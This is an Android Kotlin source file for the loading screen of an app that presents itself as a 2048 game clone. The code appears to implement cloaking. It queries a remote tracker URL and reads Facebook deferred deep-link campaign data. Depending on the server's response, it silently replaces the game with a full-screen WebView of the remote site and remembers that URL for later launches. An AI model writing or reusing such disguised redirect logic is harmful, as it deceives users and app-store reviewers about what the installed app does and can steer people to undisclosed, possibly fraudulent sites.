package com.miss.a2048.game.ui.loading

import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import androidx.navigation.findNavController
import by.kirich1409.viewbindingdelegate.viewBinding
import com.example.a2048clone.R
import com.example.a2048clone.databinding.FragmentLoadingBinding
import com.facebook.applinks.AppLinkData
import com.miss.a2048.game.data.Prefs
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext


class LoadingFragment : Fragment(R.layout.fragment_loading){

    private val binding by viewBinding(FragmentLoadingBinding::bind)
    var sPrefs : Prefs? = null

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        sPrefs = Prefs(requireActivity()).apply { getSp("fb") }
        val uri = sPrefs!!.getStr("newUrl")
        if(uri != null && uri != "")
            openWeb(uri)
        else{
            apiCall()
            //openChrome("https://scnddmn.com/7vZTBtvQ?sub1=google")
            lifecycleScope.launch{
                delay(2000)
                withContext(Dispatchers.Main){ checking() }
            }
        }

    }

    //https://scnddmn.com/7vZTBtvQ?sub1=google
    //https://scnddmn.com/7vZTBtvQ?sub1=google
    private fun checking(){
        binding.webView.apply {
            settings.javaScriptEnabled = true
//            webChromeClient = object : WebChromeClient(){
//                override fun onReceivedTitle(view: WebView?, title: String?) {
//                    super.onReceivedTitle(view, title)
//                    Log.e("Separated", title!!)
//                    if(!title.contains("404") && !title.contains("Не удалось") &&
//                        !title.contains("found") ) {
//                        var data = ""
//                        val opt = sPrefs!!.getStr("data")
//                        if(opt != null) data = opt
//                        //openChrome(" https://scnddmn.com/7vZTBtvQ?$data")
//                        openWeb("https://scnddmn.com/7vZTBtvQ?$data")
//                    }
//                    else
//                        findNavController().navigate(R.id.splash_fragment)
//                }
//            }
            webViewClient = object : WebViewClient(){

                override fun onReceivedHttpError(
                    view: WebView?,
                    request: WebResourceRequest?,
                    errorResponse: WebResourceResponse?
                ) {
                    if(errorResponse != null && errorResponse.statusCode != 404){
                        var data = ""
                        val opt = sPrefs!!.getStr("data")
                        if(opt != null) data = opt
                        //openChrome(" https://scnddmn.com/7vZTBtvQ?$data")
                        openWeb("https://scnddmn.com/7vZTBtvQ?$data")
                    }
                    else
                        findNavController().navigate(R.id.splash_fragment)
                    super.onReceivedHttpError(view, request, errorResponse)

                }
//
//                override fun onPageFinished(view: WebView?, url: String?) {
//                    super.onPageFinished(view, url)
////                    val pageTitle: String? = this@apply.title
////                    val separated =
////                        pageTitle?.split("-".toRegex())?.toTypedArray()
//                    view?.title?.let { Log.e("Title", it) }
//                    var data = ""
//                    val opt = sPrefs!!.getStr("data")
//                    if(opt != null) data = opt
//                       //openChrome(" https://scnddmn.com/7vZTBtvQ?$data")
//                    openWeb("https://scnddmn.com/7vZTBtvQ?$data")
////                    else
////                       findNavController().navigate(R.id.splash_fragment)
//                }

//                override fun shouldOverrideUrlLoading(
//                    view: WebView?,
//                    request: WebResourceRequest?
//                ): Boolean {
//                    url?.let { view!!.loadUrl(it) }
//                    return true
//                }

            }

            loadUrl("https://scnddmn.com/7vZTBtvQ")
        }

    }

    fun openWeb(url : String){
       // binding.webView.destroy()
        Log.e("Web", "Opened")
       binding.second.apply {
           settings.javaScriptEnabled = true
           webViewClient = object : WebViewClient(){
               override fun shouldOverrideUrlLoading(
                   view: WebView?,
                   request: WebResourceRequest?
               ): Boolean {
                   sPrefs?.putStr("newUrl", request?.url.toString())
                   return super.shouldOverrideUrlLoading(view, request)
               }
           }
           loadUrl(url)
           visibility = View.VISIBLE
       }
    }

    fun openChrome(url : String){
        Log.e("Launch", url)
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(requireActivity(), R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(requireActivity(), Uri.parse(url))
        requireActivity().finish()
    }

    private fun apiCall(){
        AppLinkData.fetchDeferredAppLinkData(requireActivity()){
            appLinkData ->
            if(appLinkData != null && appLinkData.targetUri != null){
                Log.e("Deep", "Srabotal")
                val uri = appLinkData.argumentBundle?.get("target_url").toString()
                val data = uri.split("?")[1]
                sPrefs!!.putStr("data", data)
                Log.e("Deep", data)
            }
        }
    }

}